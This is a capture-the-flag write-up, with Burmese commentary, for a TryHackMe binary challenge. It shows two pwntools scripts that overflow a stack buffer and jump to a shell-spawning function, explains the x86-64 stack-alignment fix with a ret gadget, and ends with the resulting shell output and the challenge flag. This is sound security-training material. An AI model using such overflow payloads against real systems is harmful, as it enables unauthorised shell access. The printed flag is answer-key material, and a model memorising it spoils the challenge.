
#### pwn103

buffer overflow ပြီး `system("/bin/sh");` ခေါ်ပေးတဲ့ function ကို jump ပေးရုံဘဲ
ဒါမဲ့

```python

from pwn import *


context.log_level = 'debug'
context.binary = "./pwn103-1644300337872.pwn103"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.133.26", 9003)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            continue
        ''')
    else:
        return process(elf.path)

#p64(0x0000000000401016)+
def exploit(p):
    payload = b"A" * 40 +  p64(0x0000000000401554)
    p.recvuntil(b"channel: ")
    p.sendline(b"3")
    p.recvuntil(b"[pwner]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)

```

```
ry harder!!! 💪

👮  Admins only:

Welcome admin 😄
[*] Got EOF while reading in interactive
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[*] Closed connection to 10.49.156.141 port 9003
[*] Got EOF while sending in interactive
                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn103]
└─$ 


```

ဒီမှာဆို အလုပ်မဖြစ်ဘူး
86-64 ABI (Application Binary Interface) အရ `system()` လိုမျိုး libc function တွေကိုခေါ်တဲ့အခါ 16-byte alignment လိုအပ် (`execve()`မှာမလို)
16 byte aligned စစ်တယ်ဆို ဆိုတာ 16 နဲ့ စားရင်ပြတ်မပြတ်စစ်တာ
ဆိုတော့ ငါတို့ system() မယ့်ကောင်ရဲ့ stack address က 8 ပိုနေလို့ 8 လျှော့အောင် `ret` ROP gadget payload ကြားညှပ်ပြီး ကို ခေါ်ရမယ် ဘာလို့ဆို 
ret ဆိုတာ pop rip ကိုလုပ်ပေးတယ် ပြီးရင် `rsp` - 8 ကိုလုပ်ပေးတယ်ဆိုတော့ ကွက်တိဘဲ ငါတို့ ပိုနေတဲ့ 8 ကိုနှုတ်ပေးတဲ့သဘော

```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn103-1644300337872.pwn103"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.156.141", 9003)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            continue
        ''')
    else:
        return process(elf.path)


def exploit(p):
    ret =  p64(0x0000000000401016)
    payload = b"A" * 40 + ret + p64(0x0000000000401554)
    p.recvuntil(b"channel: ")
    p.sendline(b"3")
    p.recvuntil(b"[pwner]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```


```
👮  Admins only:

Welcome admin 😄
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn103\n'
    b'pwn103.c\n'
flag.txt
pwn103
pwn103.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x13 bytes:
    b'THM{w3lC0m3_4Dm1N}\n'
THM{w3lC0m3_4Dm1N}
$  

```
